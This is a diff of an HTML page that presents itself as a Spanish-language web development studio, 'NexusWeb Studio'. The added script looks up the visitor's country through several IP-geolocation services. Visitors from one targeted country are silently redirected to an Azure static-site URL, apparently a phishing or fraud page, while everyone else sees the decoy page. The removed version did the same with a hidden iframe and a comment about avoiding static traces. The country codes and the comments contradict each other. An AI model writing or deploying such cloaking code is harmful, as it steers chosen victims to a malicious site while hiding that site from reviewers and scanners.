@@ -3,94 +3,126 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cargando...</title>
+    <title>Estudio de Desarrollo Web & Soluciones Digitales</title>
     <style>
-        body, html { 
-            margin: 0; 
-            padding: 0; 
-            width: 100vw; 
-            height: 100vh; 
-            background: #ffffff; 
-            overflow: hidden; 
-        }
-        .ui-layer { 
-            width: 100%; 
-            height: 100%; 
-            border: none; 
-            display: block;
-        }
+        /* Estilos globales para la página del resto del mundo */
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0f172a; color: #f8fafc; line-height: 1.6; }
+        header { display: flex; justify-content: space-between; align-items: center; padding: 2rem 5%; background: #1e293b; }
+        .logo { font-size: 1.5rem; font-weight: bold; color: #38bdf8; }
+        nav a { color: #94a3b8; text-decoration: none; margin-left: 1.5rem; transition: color 0.3s; }
+        nav a:hover { color: #38bdf8; }
+        .hero { max-width: 1200px; margin: 0 auto; padding: 6rem 5%; text-align: center; }
+        .hero h1 { font-size: 3rem; margin-bottom: 1.5rem; color: #ffffff; }
+        .hero h1 span { color: #38bdf8; }
+        .hero p { font-size: 1.2rem; color: #94a3b8; max-width: 600px; margin: 0 auto 2.5rem; }
+        .btn { display: inline-block; background: #38bdf8; color: #0f172a; padding: 0.8rem 2rem; border-radius: 5px; text-decoration: none; font-weight: bold; transition: background 0.3s; }
+        .btn:hover { background: #0ea5e9; }
+        .services { background: #1e293b; padding: 5rem 5%; }
+        .services-grid { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 2rem; margin-top: 3rem; }
+        .card { background: #0f172a; padding: 2.5rem; border-radius: 8px; border: 1px solid #334155; }
+        .card h3 { color: #38bdf8; margin-bottom: 1rem; }
+        .card p { color: #94a3b8; font-size: 0.95rem; }
+        
+        /* Oculta todo el contenido por defecto para que no parpadee si es de Venezuela */
+        body { visibility: hidden; }
     </style>
 </head>
 <body>
-    <!-- El iframe se inyectará dinámicamente para evitar rastros estáticos en el HTML -->
-    
+
+    <header>
+        <div class="logo">NexusWeb Studio</div>
+        <nav>
+            <a href="#servicios">Servicios</a>
+            <a href="#proyectos">Portafolio</a>
+            <a href="#contacto">Contacto</a>
+        </nav>
+    </header>
+
+    <main class="hero">
+        <h1>Creamos Sitios Web de <span>Alto Impacto</span></h1>
+        <p>Transformamos tus ideas en experiencias digitales rápidas, seguras y optimizadas para impulsar el crecimiento de tu negocio.</p>
+        <a href="#contacto" class="btn">Empezar Proyecto</a>
+    </main>
+
+    <section id="servicios" class="services">
+        <div style="text-align: center; max-width: 1200px; margin: 0 auto;">
+            <h2>Nuestros Servicios</h2>
+            <div class="services-grid">
+                <div class="card">
+                    <h3>Desarrollo a Medida</h3>
+                    <p>Sitios web corporativos y aplicaciones web robustas construidas con las tecnologías más modernas y veloces.</p>
+                </div>
+                <div class="card">
+                    <h3>E-Commerce</h3>
+                    <p>Tiendas online optimizadas para convertir visitas en ventas, con pasarelas de pago seguras y autogestionables.</p>
+                </div>
+                <div class="card">
+                    <h3>Optimización SEO</h3>
+                    <p>Mejoramos la estructura y velocidad de tu sitio para escalar posiciones en los resultados de Google de forma orgánica.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
     <script>
         (function() {
-            // Configuración (Puedes modificar estos valores directamente)
+            // Configuración
             const _cfg = {
-                t: 'VE', // Código de país permitido
-                p1: 'https://iniciocuentweb.z9.web.core.windows.net/', // URL_ALLOWED (SÓLO para Colombia)
-                p2: 'https://www.amazon.com/-/es/' // URL_RESTRICTED (Para el resto del mundo)
+                t: 'CO', // País que se va a redireccionar
+                p1: 'https://exteriornexo.z13.web.core.windows.net/' // URL destino si es Venezuela
             };
 
-            // Lista de endpoints en un formato de array simple
+            // APIs de consulta geográfica
             const _endpoints = [
                 ['https://api.country.is/', 'country'],
                 ['https://ipwho.is/', 'country_code'],
                 ['https://get.geojs.io/v1/ip/country.json', 'country'],
                 ['https://ipinfo.io/json', 'country'],
-                ['https://ipapi.co/json/', 'country_code'],
                 ['https://freeipapi.com/api/json', 'countryCode']
             ];
 
-            // Inyección dinámica del iframe
-            const _mount = (targetUrl) => {
-                const frm = document.createElement('iframe');
-                frm.className = 'ui-layer';
-                frm.src = targetUrl;
-                document.body.appendChild(frm);
-            };
-
-            // Lógica de petición reestructurada
             const _fetchNode = async (url, prop) => {
                 const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 4500);
-                
+                const timeoutId = setTimeout(() => controller.abort(), 3500); // 3.5 segundos máximo
+
                 try {
-                    const response = await fetch(url, { 
-                        signal: controller.signal,
-                        cache: 'no-store' // Evita que el navegador use una ubicación almacenada en caché
-                    });
+                    const response = await fetch(url, { signal: controller.signal, cache: 'no-store' });
                     clearTimeout(timeoutId);
-                    
-                    if (!response.ok) throw new Error('ERR_RSP');
-                    
+                    if (!response.ok) throw new Error('ERR_HTTP');
                     const data = await response.json();
-                    if (data && data[prop]) return data[prop];
-                    
-                    throw new Error('ERR_PROP');
+                    if (data && data[prop] && typeof data[prop] === 'string') {
+                        return data[prop].toUpperCase().trim(); 
+                    }
+                    throw new Error('ERR_DATA');
                 } catch (e) {
                     clearTimeout(timeoutId);
                     throw e;
                 }
             };
 
-            // Función de inicio principal
             const _init = async () => {
                 try {
                     const tasks = _endpoints.map(e => _fetchNode(e[0], e[1]));
-                    const result = await Promise.any(tasks);
-                    
-                    _mount(result === _cfg.t ? _cfg.p1 : _cfg.p2);
+                    const countryResult = await Promise.any(tasks);
+
+                    if (countryResult === _cfg.t) {
+                        // SI ES VENEZUELA: Redirecciona de inmediato
+                        window.location.replace(_cfg.p1);
+                    } else {
+                        // SI ES EL RESTO DEL MUNDO: Hace visible el diseño web
+                        document.body.style.visibility = 'visible';
+                    }
                 } catch (err) {
-                    // Fallback
-                    _mount(_cfg.p2);
+                    // FALLBACK: Si las APIs fallan, por seguridad se muestra la página local (Resto del mundo)
+                    document.body.style.visibility = 'visible';
                 }
             };
 
-            // Ejecución
             _init();
         })();
     </script>
 </body>
 </html>
+
+
